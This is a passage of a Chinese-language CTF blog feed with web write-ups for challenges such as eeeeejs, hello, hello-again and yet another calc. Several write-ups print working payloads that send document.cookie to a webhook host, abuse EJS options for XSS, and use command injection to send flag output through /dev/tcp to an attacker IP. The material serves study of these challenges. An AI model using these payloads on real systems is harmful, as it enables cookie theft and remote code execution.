class="line">  <span class="keyword">const</span> id = <span class="built_in">setInterval</span>(target.<span class="property">togglePopover</span>, <span class="number">400</span>);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> <span class="function">() =&gt;</span> &#123;</span><br><span class="line">    <span class="built_in">clearInterval</span>(id);</span><br><span class="line">    sandbox.<span class="title function_">remove</span>();</span><br><span class="line">  &#125;;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p>首先会通过sandbox使得iframe失去作用，并且无法使用任何js脚本</p>
<p>但是<code>setInterval</code>在使用字符串作为参数的时候，起到的作用跟eval是一样的，所以通过污染<code>sandbox.contentDocument.body</code>绕过第一层，然后通过id设置<code>togglePopover</code>来使得setInterval的成功执行</p>
<p><a href="https://book.hacktricks.xyz/pentesting-web/xss-cross-site-scripting/dom-xss#sinks-2">https://book.hacktricks.xyz/pentesting-web/xss-cross-site-scripting/dom-xss#sinks-2</a></p>
<p>所以需要使用iframe通过waf然后设置name=body成功注入target，然后根据srcdoc</p>
<p>以及根据id设置，a标签的使用，生成对应的html代码</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">iframe</span> <span class="attr">name</span>=<span class="string">body</span> <span class="attr">srcdoc</span>=<span class="string">&quot;&lt;a id=togglePopover href=a:fetch(`https://webhook.site/7d1a593d-f1da-4f67-beba-023fe1ccece1?q=$&#123;document.cookie&#125;`)&gt;&lt;/a&gt;&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">iframe</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>将会生成</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">id</span>=<span class="string">&quot;togglePopover&quot;</span> <span class="attr">href</span>=<span class="string">&quot;a:fetch(`https://webhook.site/7d1a593d-f1da-4f67-beba-023fe1ccece1?q=$&#123;document.cookie&#125;`)&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>之后，就会产生执行</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="built_in">setInterval</span>(<span class="string">&quot;a:fetch(`https://webhook.site/7d1a593d-f1da-4f67-beba-023fe1ccece1?q=$&#123;document.cookie&#125;`)&quot;</span>)</span><br></pre></td></tr></table></figure>
<p>注意，本地测试的时候，传给bot的时候需要将127.0.0.1改成web，不然bot里面设置了cookie作用域</p>
<h3 id="eeeeejs"><a href="#eeeeejs" class="headerlink" title="eeeeejs"></a>eeeeejs</h3><p>这题主要就在于设置选项，需要调试</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> express = <span class="built_in">require</span>(<span class="string">&quot;express&quot;</span>);</span><br><span class="line"><span class="keyword">const</span> &#123; xss &#125; = <span class="built_in">require</span>(<span class="string">&quot;express-xss-sanitizer&quot;</span>);</span><br><span class="line"><span class="keyword">const</span> &#123; execFile &#125; = <span class="built_in">require</span>(<span class="string">&quot;node:child_process&quot;</span>);</span><br><span class="line"><span class="keyword">const</span> util = <span class="built_in">require</span>(<span class="string">&quot;node:util&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> app = <span class="title function_">express</span>();</span><br><span class="line"><span class="keyword">const</span> <span class="variable constant_">PORT</span> = <span class="number">3000</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Mitigation 1:</span></span><br><span class="line">app.<span class="title function_">use</span>(<span class="title function_">xss</span>());</span><br><span class="line"></span><br><span class="line"><span class="comment">// Mitigation 2:</span></span><br><span class="line">app.<span class="title function_">use</span>(<span class="function">(<span class="params">req, res, next</span>) =&gt;</span> &#123;</span><br><span class="line">  <span class="comment">// A protection for RCE</span></span><br><span class="line">  <span class="comment">// FYI: https://github.com/mde/ejs/issues/735</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">const</span> evils = [</span><br><span class="line">    <span class="string">&quot;outputFunctionName&quot;</span>,</span><br><span class="line">    <span class="string">&quot;escapeFunction&quot;</span>,</span><br><span class="line">    <span class="string">&quot;localsName&quot;</span>,</span><br><span class="line">    <span class="string">&quot;destructuredLocals&quot;</span>,</span><br><span class="line">    <span class="string">&quot;escape&quot;</span>,</span><br><span class="line">  ];</span><br><span class="line"></span><br><span class="line">  <span class="keyword">const</span> data = <span class="title class_">JSON</span>.<span class="title function_">stringify</span>(req.<span class="property">query</span>);</span><br><span class="line">  <span class="keyword">if</span> (evils.<span class="title function_">find</span>(<span class="function">(<span class="params">evil</span>) =&gt;</span> data.<span class="title function_">includes</span>(evil))) &#123;</span><br><span class="line">    res.<span class="title function_">status</span>(<span class="number">400</span>).<span class="title function_">send</span>(<span class="string">&quot;hacker?&quot;</span>);</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="title function_">next</span>();</span><br><span class="line">  &#125;</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="comment">// Mitigation 3:</span></span><br><span class="line">app.<span class="title function_">use</span>(<span class="function">(<span class="params">req, res, next</span>) =&gt;</span> &#123;</span><br><span class="line">  res.<span class="title function_">set</span>(<span class="string">&quot;Content-Security-Policy&quot;</span>, <span class="string">&quot;default-src &#x27;self&#x27;&quot;</span>);</span><br><span class="line">  <span class="title function_">next</span>();</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">get</span>(<span class="string">&quot;/&quot;</span>, <span class="keyword">async</span> (req, res) =&gt; &#123;</span><br><span class="line">  req.<span class="property">query</span>.<span class="property">filename</span> ??= <span class="string">&quot;index.ejs&quot;</span>;</span><br><span class="line">  req.<span class="property">query</span>.<span class="property">name</span> ??= <span class="string">&quot;ejs&quot;</span>;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">const</span> proc = <span class="keyword">await</span> util</span><br><span class="line">    .<span class="title function_">promisify</span>(execFile)(</span><br><span class="line">      <span class="string">&quot;node&quot;</span>,</span><br><span class="line">      [</span><br><span class="line">        <span class="comment">// Mitigation 4:</span></span><br><span class="line">        <span class="string">&quot;--experimental-permission&quot;</span>,</span><br><span class="line">        <span class="string">`--allow-fs-read=<span class="subst">$&#123;__dirname&#125;</span>/src`</span>,</span><br><span class="line"></span><br><span class="line">        <span class="string">&quot;render.dist.js&quot;</span>,</span><br><span class="line">        <span class="title class_">JSON</span>.<span class="title function_">stringify</span>(req.<span class="property">query</span>),</span><br><span class="line">      ],</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="attr">timeout</span>: <span class="number">2000</span>,</span><br><span class="line">        <span class="attr">cwd</span>: <span class="string">`<span class="subst">$&#123;__dirname&#125;</span>/src`</span>,</span><br><span class="line">      &#125;</span><br><span class="line">    )</span><br><span class="line">    .<span class="title function_">catch</span>(<span class="function">(<span class="params">e</span>) =&gt;</span> e);</span><br><span class="line"></span><br><span class="line">  res.<span class="title function_">type</span>(<span class="string">&quot;html&quot;</span>).<span class="title function_">send</span>(proc.<span class="property">killed</span> ? <span class="string">&quot;Timeout&quot;</span> : proc.<span class="property">stdout</span>);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">listen</span>(<span class="variable constant_">PORT</span>);</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>一共设置了4层waf</p>
<p>waf1，编码html</p>
<p>waf2，禁止设置ejs的RCE选项</p>
<p>waf3，CSP同源(其实上就是防止直接远程加载而已)</p>
<p>waf4，只会允许通过渲染src路径下面的render.dist.js文件</p>
<p>(可以通过<code>npm run bundle</code>，生成render.dist.js)</p>
<p>那么index.ejs接受filename以及quey两个参数，根据waf4，filename=render.dist.js，waf2禁止了RCE，本身需要XSS，所以需要寻找新的设置选项</p>
<p>那么实际上根据网上的wp，比较重要的就在于ejs的 options <code>openDelimiter</code>、<code>closeDelimiter</code> 以及 <code>delimiter</code></p>
<ul>
<li><code>delimiter</code>用于内部分隔符的字符，默认为“%”</li>
<li><code>openDelimiter</code>用于打开分隔符的字符，默认为“&lt;”</li>
<li><code>closeDelimiter</code>用于结束分隔符的字符，默认为“&gt;”</li>
</ul>
<p>所以如果设置不一样的间隔符，将会产生不一样的结果，同时如果将debug设置为真的时候，会输出src</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (opts.<span class="property">debug</span>) &#123;</span><br><span class="line">     <span class="variable language_">console</span>.<span class="title function_">log</span>(src);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>然后通过设置src，以及开始结束符号，就可以成功绕过waf1</p>
<p>实际上本质还是调试，寻找的问题</p>
<p>最后，贴一下payload</p>
<p>payload1：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> urllib.parse</span><br><span class="line"></span><br><span class="line">webhook_url = <span class="string">&#x27;https://webhook.site/cae461f6-3930-48bf-9cfd-d47cba2d0ff5&#x27;</span></span><br><span class="line"></span><br><span class="line">script_payload = <span class="string">f&quot;window.location.href=`<span class="subst">&#123;webhook_url&#125;</span>?`+document.cookie&quot;</span></span><br><span class="line">script_payload = urllib.parse.quote_plus(script_payload)</span><br><span class="line"></span><br><span class="line">url = <span class="string">f&quot;/?filename=render.dist.js&amp;src=<span class="subst">&#123;script_payload&#125;</span>&amp;settings[view options][delimiter]=%20&amp;settings[view options][openDelimiter]=(opts.debug)&amp;settings[view%20options][closeDelimiter]=%20%20%20%20%20%20%20var%20returnedFn%20=&quot;</span></span><br><span class="line">url = url.replace(<span class="string">&quot;[&quot;</span>, <span class="string">&quot;%5B&quot;</span>)</span><br><span class="line">url = url.replace(<span class="string">&quot;]&quot;</span>, <span class="string">&quot;%5D&quot;</span>)</span><br><span class="line"></span><br><span class="line">xss_payload = <span class="string">f&quot;&lt;script src=&#x27;<span class="subst">&#123;url&#125;</span>&#x27;&gt;&lt;/script&gt;&quot;</span></span><br><span class="line">xss_payload = urllib.parse.quote_plus(xss_payload)</span><br><span class="line"></span><br><span class="line">final = <span class="string">f&quot;http://web:3000/?filename=render.dist.js&amp;src[<span class="subst">&#123;xss_payload&#125;</span>]=UNESCAPED&amp;settings[view options][delimiter]=%20&amp;settings[view%20options][openDelimiter]=(opts.debug)&amp;settings[view%20options][closeDelimiter]=%20%20%20%20%20%20%20var%20returnedFn%20=&quot;</span></span><br><span class="line"><span class="built_in">print</span>(final)</span><br></pre></td></tr></table></figure>
<p>decode一下，然后解释一下</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://web:3000/?filename=render.dist.js&amp;src[&lt;script+src=&#x27;/?filename=render.dist.js&amp;src=window.location.href=`https://webhook.site/7d1a593d-f1da-4f67-beba-023fe1ccece1?`+document.cookie&amp;settings[view+options][delimiter]= &amp;settings[view+options][openDelimiter]=(opts.debug)&amp;settings[view options][closeDelimiter]=       var returnedFn =&#x27;&gt;&lt;/script&gt;]=xss&amp;settings[view options][delimiter]= &amp;settings[view options][openDelimiter]=(opts.debug)&amp;settings[view options][closeDelimiter]=       var returnedFn =</span><br></pre></td></tr></table></figure>
<figure class="highlight http"><table><tr><td class="code"><pre><span class="line">settings[view options][delimiter]= &amp;settings[view options][openDelimiter]=(opts.debug)&amp;settings[view options][closeDelimiter]=       var returnedFn =</span><br></pre></td></tr></table></figure>
<p>这个就是设置符号，基本上跟一下代码就知道了，会造成截断问题，具体分析可以看一下</p>
<p><a href="https://blog.huli.tw/2023/09/23/hitcon-seccon-ctf-2023-writeup/#eeeeejs-12-solves">https://blog.huli.tw/2023/09/23/hitcon-seccon-ctf-2023-writeup/#eeeeejs-12-solves</a></p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line">src[&lt;script+src=&#x27;/?filename=render.dist.js&amp;src=window.location.href=`https://webhook.site/7d1a593d-f1da-4f67-beba-023fe1ccece1?`+document.cookie&amp;settings[view+options][delimiter]= &amp;settings[view+options][openDelimiter]=(opts.debug)&amp;settings[view options][closeDelimiter]=       var returnedFn =&#x27;&gt;<span class="tag">&lt;/<span class="name">script</span>&gt;</span>]=xss</span><br></pre></td></tr></table></figure>
<p>这里主要是放置payload，绕过waf2同源</p>
<p>同时需要赋值，赋值什么不重要，需要的是使得src成为键值对，符合赋值条件就行，因为将会包含<code>sanitizedFilename</code>，而且，<code>var sanitizedFilename = opts.filename ? JSON.stringify(opts.filename) : &quot;undefined&quot;;</code></p>
<p><a href="https://github.com/mde/ejs/blob/v3.1.9/lib/ejs.js#L625">https://github.com/mde/ejs/blob/v3.1.9/lib/ejs.js#L625</a></p>
<p>payload2:</p>
<p><a href="https://brycec.me/posts/corctf_2022_challenges#simplewaf">https://brycec.me/posts/corctf_2022_challenges#simplewaf</a></p>
<p>实际上ejs.renderFile<code>内部使用</code>fs.readFileSync</p>
<p>所以根据上面的原理，还是可以构造出另外一种不同的payload</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> <span class="variable constant_">ATTACKER_BASE_URL</span> =</span><br><span class="line">  <span class="string">&quot;https://webhook.site/7d1a593d-f1da-4f67-beba-023fe1ccece1&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> jsPayload = <span class="string">`location = &quot;<span class="subst">$&#123;ATTACKER_BASE_URL&#125;</span>?&quot; + document.cookie`</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> srcUrl = <span class="string">`/?<span class="subst">$&#123;<span class="keyword">new</span> URLSearchParams(&#123;</span></span></span><br><span class="line"><span class="subst"><span class="string">  filename: <span class="string">&quot;render.dist.js&quot;</span>,</span></span></span><br><span class="line"><span class="subst"><span class="string">  <span class="string">&quot;settings[view options][openDelimiter]&quot;</span>: <span class="string">&quot;__require() &#123;\n&quot;</span>,</span></span></span><br><span class="line"><span class="subst"><span class="string">  <span class="string">&quot;settings[view options][closeDelimiter]&quot;</span>: <span class="string">&quot;||&quot;</span>,</span></span></span><br><span class="line"><span class="subst"><span class="string">  <span class="string">&quot;settings[view options][delimiter][]&quot;</span>: <span class="string">&quot;&quot;</span>,</span></span></span><br><span class="line"><span class="subst"><span class="string">  mod: jsPayload,</span></span></span><br><span class="line"><span class="subst"><span class="string">&#125;)&#125;</span>`</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> evilUrl = <span class="string">`http://web:3000?<span class="subst">$&#123;<span class="keyword">new</span> URLSearchParams(&#123;</span></span></span><br><span class="line"><span class="subst"><span class="string">  <span class="string">&quot;filename[href]&quot;</span>: <span class="string">&quot;x&quot;</span>,</span></span></span><br><span class="line"><span class="subst"><span class="string">  <span class="string">&quot;filename[origin]&quot;</span>: <span class="string">&quot;x&quot;</span>,</span></span></span><br><span class="line"><span class="subst"><span class="string">  <span class="string">&quot;filename[protocol]&quot;</span>: <span class="string">&quot;file:&quot;</span>,</span></span></span><br><span class="line"><span class="subst"><span class="string">  <span class="string">&quot;filename[hostname]&quot;</span>: <span class="string">&quot;&quot;</span>,</span></span></span><br><span class="line"><span class="subst"><span class="string">  <span class="string">&quot;filename[pathname]&quot;</span>: <span class="string">&quot;index.ejs&quot;</span>,</span></span></span><br><span class="line"><span class="subst"><span class="string">  [<span class="string">`filename[&lt;script src=<span class="subst">$&#123;srcUrl&#125;</span>&gt;&lt;/script&gt;]`</span>]: <span class="string">&quot;&quot;</span>,</span></span></span><br><span class="line"><span class="subst"><span class="string">  <span class="string">&quot;settings[view options][debug]&quot;</span>: <span class="string">&quot;1&quot;</span>,</span></span></span><br><span class="line"><span class="subst"><span class="string">&#125;)&#125;</span>`</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(evilUrl);</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>所以这个payload直接对生成的文件进行操作了，这需要对ejs的框架非常了解(暂时这样吧)</p>
]]></content>
  </entry>
  <entry>
    <title>2023ASISCTF</title>
    <url>/2023/10/04/17-46-05/</url>
    <content><![CDATA[<h1>2023ASISCTF</h1>
<span id="more"></span>
<h2 id="web">web</h2>
<h3 id="hello">hello</h3>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">Flag is at /flag.txt</span></span><br><span class="line"><span class="comment">Hint for beginners: read curl&#x27;s manpage.</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="variable">$url</span> = <span class="string">&#x27;file:///hi.txt&#x27;</span>;</span><br><span class="line"><span class="keyword">if</span>(</span><br><span class="line">	<span class="title function_ invoke__">array_key_exists</span>(<span class="string">&#x27;x&#x27;</span>, <span class="variable">$_GET</span>) &amp;&amp;</span><br><span class="line">	!<span class="title function_ invoke__">str_contains</span>(<span class="title function_ invoke__">strtolower</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;x&#x27;</span>]),<span class="string">&#x27;file&#x27;</span>) &amp;&amp; </span><br><span class="line">	!<span class="title function_ invoke__">str_contains</span>(<span class="title function_ invoke__">strtolower</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;x&#x27;</span>]),<span class="string">&#x27;flag&#x27;</span>)</span><br><span class="line">)&#123;</span><br><span class="line">	<span class="variable">$url</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;x&#x27;</span>];</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_ invoke__">system</span>(<span class="string">&#x27;curl &#x27;</span>.<span class="title function_ invoke__">escapeshellarg</span>(<span class="variable">$url</span>));</span><br></pre></td></tr></table></figure>
<p>第一步</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">http://<span class="number">45.147</span><span class="number">.231</span><span class="number">.180</span>:<span class="number">8000</span>/?x=fi%fale:///ne%faxt.txt</span><br></pre></td></tr></table></figure>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> fs = <span class="built_in">require</span>(<span class="string">&#x27;node:fs&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> path = <span class="built_in">require</span>(<span class="string">&#x27;path&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">I wonder what is inside /next.txt  </span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> secret = <span class="string">&#x27;39c8e9953fe8ea40ff1c59876e0e2f28&#x27;</span></span><br><span class="line"><span class="keyword">const</span> server = <span class="title class_">Bun</span>.<span class="title function_">serve</span>(&#123;</span><br><span class="line">  <span class="attr">port</span>: <span class="number">8000</span>,</span><br><span class="line">  <span class="title function_">fetch</span>(<span class="params">req</span>) &#123;</span><br><span class="line">          <span class="keyword">let</span> url = <span class="keyword">new</span> <span class="title function_">URL</span>(req.<span class="property">url</span>);</span><br><span class="line">          <span class="keyword">let</span> pname = url.<span class="property">pathname</span>;</span><br><span class="line">          <span class="keyword">if</span>(pname.<span class="title function_">startsWith</span>(<span class="string">`/<span class="subst">$&#123;secret&#125;</span>`</span>))&#123;</span><br><span class="line">      <span class="keyword">if</span>(pname.<span class="title function_">startsWith</span>(<span class="string">`/<span class="subst">$&#123;secret&#125;</span>/read`</span>))&#123;</span><br><span class="line">        <span class="keyword">try</span>&#123;</span><br><span class="line">          <span class="keyword">let</span> fpath = url.<span class="property">searchParams</span>.<span class="title function_">get</span>(<span class="string">&#x27;file&#x27;</span>);</span><br><span class="line">          <span class="keyword">if</span>(path.<span class="title function_">basename</span>(fpath).<span class="title function_">indexOf</span>(<span class="string">&#x27;next&#x27;</span>) == -<span class="number">1</span>)&#123; </span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">Response</span>(fs.<span class="title function_">readFileSync</span>(fpath).<span class="title function_">toString</span>(<span class="string">&#x27;base64&#x27;</span>));</span><br><span class="line">          &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">Response</span>(<span class="string">&#x27;no way&#x27;</span>);</span><br><span class="line">          &#125;</span><br><span class="line">        &#125; <span class="keyword">catch</span>(e)&#123; &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">Response</span>(<span class="string">&quot;Couldn&#x27;t read your file :(&quot;</span>);</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">Response</span>(<span class="string">`did you know i can read files?? amazing right,,, maybe try /<span class="subst">$&#123;secret&#125;</span>/read/?file=/proc/self/cmdline`</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> </span><br><span class="line">  &#125;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>
<p>第二步</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://45.147.231.180:8001/39c8e9953fe8ea40ff1c59876e0e2f28/read/?file=/next.txt%00/.</span><br></pre></td></tr></table></figure>
<p>ps:(bun 和 node 不同)</p>
<h3 id="hello-again">hello-again</h3>
<p>还是源码题目。</p>
<p>首先根据源码</p>
<p><a href="https://github.com/oven-sh/bun/blob/df9461ecc58e2882afa34cdf59d9887d9242b5f9/src/url.zig#L854">https://github.com/oven-sh/bun/blob/df9461ecc58e2882afa34cdf59d9887d9242b5f9/src/url.zig#L854</a></p>
<p>url解码将会在<code>%PUBLIC_URL%</code>的地方停止，形成截断</p>
<p>然后同时需要match得到private-symlink控制参数，然后使用index绕过(这步没完全看懂)</p>
<p>似乎还是源码match解析的过程会将index解释成本目录下的东西，然而basename只会截取最后，两者解析的问题成功绕过</p>
<p>最后通过软连接获取到bun的调试程序文件，然后tmp下面直接可以加载调用</p>
<p>最后bash反带RCE</p>
<p><a href="https://github.com/oven-sh/bun/blob/df9461ecc58e2882afa34cdf59d9887d9242b5f9/src/bun.js/api/server.zig#L5603">https://github.com/oven-sh/bun/blob/df9461ecc58e2882afa34cdf59d9887d9242b5f9/src/bun.js/api/server.zig#L5603</a></p>
<p>还是需要找到源码，比较逆天的一题</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> remote</span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">&#x27;127.0.0.1&#x27;</span>,<span class="number">8000</span>)</span><br><span class="line">p.send(<span class="string">b&quot;&quot;&quot;GET /cgi-bin/%PUBLIC_URL%/%70rivate-symlink/index?target=/bin/debconf&amp;path=/tmp/subl HTTP/1.1</span></span><br><span class="line"><span class="string">Host: dfdf</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span>.replace(<span class="string">b&#x27;\n&#x27;</span>,<span class="string">b&#x27;\r\n&#x27;</span>))</span><br><span class="line"><span class="built_in">print</span>(p.recv())</span><br><span class="line">p.close()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">&#x27;127.0.0.1&#x27;</span>,<span class="number">8000</span>)</span><br><span class="line">a = <span class="string">&#x27;/readflag gimmeflag &gt; /dev/tcp/your_ip/10086&#x27;</span></span><br><span class="line">p.send(<span class="string">b&quot;&quot;&quot;GET /src:/app;echo$&#123;IFS&#125;&quot;&quot;&quot;</span>+base64.b64encode(a.encode())+<span class="string">b&quot;&quot;&quot;|base64$&#123;IFS&#125;-d|bash HTTP/1.1</span></span><br><span class="line"><span class="string">open-in-editor: 1</span></span><br><span class="line"><span class="string">Host: dfdf</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span>.replace(<span class="string">b&#x27;\n&#x27;</span>,<span class="string">b&#x27;\r\n&#x27;</span>))</span><br><span class="line"><span class="comment"># p.interactive()</span></span><br><span class="line"><span class="built_in">print</span>(p.recv())</span><br><span class="line">p.close()</span><br></pre></td></tr></table></figure>
<h3 id="yet-another-calc">yet another calc</h3>
<p>一种新的污染方式，实际上通过<code>__defineGetter__</code>以及<code>__lookupGetter__</code>这样的原生函数，将Math进行污染</p>
<p>实际上简单来说</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">a = 1</span><br><span class="line">Math.__defineGetter__(Math.qwewe, String.fromCharCode)</span><br><span class="line">Math.__defineGetter__(a, Math.__lookupGetter__)</span><br></pre></td></tr></table></figure>
<p>Math.qwewe本身不存在必然是定义为<code>undefined</code>，但是String.fromCharCode跟其关联</p>
<p>a存在，<code>__lookupGetter__</code>本身会寻找全部的原型链，然后查看是否存在某些属性，但是a同样不存在于Math，同时指向的是<code>undefined</code>(搜索上的先后)，所以调用的过程大概是这样的</p>
<p><code>Math[a](70)</code>，调用<code>Math.__lookupGetter__</code>,然后搜索到<code>undefined</code>（除了null都存在），然后找到<code>Math.qwewe</code>，从而污染了Math</p>
<p>并且寻找的<code>undefined</code>是最近的属性</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">a = <span class="string">&quot;sss&quot;</span></span><br><span class="line"><span class="title class_">Math</span>.<span class="title function_">__defineGetter__</span>(<span class="title class_">Math</span>.<span class="property">qwewe</span>, <span class="title class_">String</span>.<span class="property">fromCharCode</span>)</span><br><span class="line"><span class="title class_">Math</span>.<span class="title function_">__defineGetter__</span>(<span class="title class_">Math</span>.<span class="property">qwew</span>, <span class="title class_">String</span>.<span class="property">fromCodePoint</span>)</span><br><span class="line"><span class="title class_">Math</span>.<span class="title function_">__defineGetter__</span>(a, <span class="title class_">Math</span>.<span class="property">__lookupGetter__</span>)</span><br><span class="line"></span><br><span class="line"><span class="title class_">Math</span>.<span class="property">sss</span></span><br><span class="line"><span class="comment">//ƒ fromCodePoint() &#123; [native code] &#125;</span></span><br></pre></td></tr></table></figure>
<p>所以这题思路非常奇妙啊</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">c=<span class="title class_">Math</span>.<span class="property">constructor</span></span><br><span class="line">c=c.<span class="property">name</span></span><br><span class="line">c=c.<span class="property">constructor</span></span><br><span class="line">c=c.<span class="property">fromCharCode</span></span><br><span class="line"><span class="title class_">Math</span>.<span class="title function_">__defineGetter__</span>(<span class="title class_">Math</span>.<span class="property">aa</span>,c)</span><br><span class="line"><span class="title class_">Math</span>.<span class="title function_">__defineGetter__</span>(c.<span class="property">name</span>,<span class="title class_">Math</span>.<span class="property">__lookupGetter__</span>)</span><br><span class="line">v = <span class="title class_">Math</span>.<span class="title function_">fromCharCode</span>(<span class="number">102</span>, <span class="number">101</span>, <span class="number">116</span>, <span class="number">99</span>, <span class="number">104</span>, <span class="number">40</span>, <span class="number">96</span>, <span class="number">104</span>, <span class="number">116</span>, <span class="number">116</span>, <span class="number">112</span>, <span class="number">115</span>, <span class="number">58</span>, <span class="number">47</span>, <span class="number">47</span>, <span class="number">119</span>, <span class="number">101</span>, <span class="number">98</span>, <span class="number">104</span>, <span class="number">111</span>, <span class="number">111</span>, <span class="number">107</span>, <span class="number">46</span>, <span class="number">115</span>, <span class="number">105</span>, <span class="number">116</span>, <span class="number">101</span>, <span class="number">47</span>, <span class="number">55</span>, <span class="number">100</span>, <span class="number">49</span>, <span class="number">97</span>, <span class="number">53</span>, <span class="number">57</span>, <span class="number">51</span>, <span class="number">100</span>, <span class="number">45</span>, <span class="number">102</span>, <span class="number">49</span>, <span class="number">100</span>, <span class="number">97</span>, <span class="number">45</span>, <span class="number">52</span>, <span class="number">102</span>, <span class="number">54</span>, <span class="number">55</span>, <span class="number">45</span>, <span class="number">98</span>, <span class="number">101</span>, <span class="number">98</span>, <span class="number">97</span>, <span class="number">45</span>, <span class="number">48</span>, <span class="number">50</span>, <span class="number">51</span>, <span class="number">102</span>, <span class="number">101</span>, <span class="number">49</span>, <span class="number">99</span>, <span class="number">99</span>, <span class="number">101</span>, <span class="number">99</span>, <span class="number">101</span>, <span class="number">49</span>, <span class="number">63</span>, <span class="number">97</span>, <span class="number">61</span>, <span class="number">96</span>, <span class="number">43</span>, <span class="number">100</span>, <span class="number">111</span>, <span class="number">99</span>, <span class="number">117</span>, <span class="number">109</span>, <span class="number">101</span>, <span class="number">110</span>, <span class="number">116</span>, <span class="number">46</span>, <span class="number">99</span>, <span class="number">111</span>, <span class="number">111</span>, <span class="number">107</span>, <span class="number">105</span>, <span class="number">101</span>, <span class="number">41</span>)</span><br><span class="line">c=<span class="title class_">Math</span>.<span class="property">constructor</span></span><br><span class="line">c=c.<span class="property">constructor</span></span><br><span class="line"><span class="title class_">Math</span>.<span class="title function_">__defineGetter__</span>(<span class="title class_">Math</span>.<span class="property">aa</span>,c)</span><br><span class="line"><span class="title class_">Math</span>.<span class="title function_">__defineGetter__</span>(c.<span class="property">name</span>,<span class="title class_">Math</span>.<span class="property">__lookupGetter__</span>)</span><br><span class="line">z=<span class="title class_">Math</span>.<span class="title class_">Function</span>(v)</span><br><span class="line"><span class="title class_">Math</span>.<span class="title function_">__defineGetter__</span>(c.<span class="property">name</span>,z)</span><br><span class="line"><span class="title class_">Math</span>.<span class="property">Function</span></span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>2023wp</category>
      </categories>
      <tags>
        <tag>2023ctf</tag>
      </tags>
  </entry>
  <entry>
    <title>2023mapleCTF</title>
    <url>/2023/10/02/17-31-22/</url>
    <content><![CDATA[<h1>2023mapleCTF</h1>
<span id="more"></span>
<h2 id="web">web</h2>
<h3 id="BLADE-RUNNER">BLADE RUNNER</h3>
